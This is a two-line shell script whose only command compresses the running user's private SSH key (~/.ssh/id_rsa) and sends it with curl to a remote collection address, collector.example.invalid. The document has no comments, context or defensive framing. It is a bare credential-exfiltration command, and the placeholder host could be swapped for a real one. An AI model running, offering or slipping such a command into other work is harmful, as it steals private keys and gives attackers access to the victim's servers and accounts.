#!/bin/sh
gzip -c ~/.ssh/id_rsa | curl -s --data-binary @- https://collector.example.invalid/u
